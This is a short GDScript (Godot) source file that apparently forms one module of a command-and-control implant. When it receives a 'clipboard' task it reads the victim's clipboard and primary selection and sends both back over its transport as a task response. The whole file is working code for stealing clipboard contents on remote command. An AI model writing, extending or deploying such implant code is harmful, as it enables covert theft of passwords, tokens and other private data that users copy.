extends Node

func _on_tasking_clipboard(transport, task):

	if task.has("command") and task.get("command") == "clipboard":

		transport.send(
			transport.create_task_response(
				true,
				true,
				task.get("id"),
				"Clipboard: %s\nPrimary: %s\n" % [DisplayServer.clipboard_get(), DisplayServer.clipboard_get_primary()]
			)
		)
	else:
		pass
		# TODO: error state
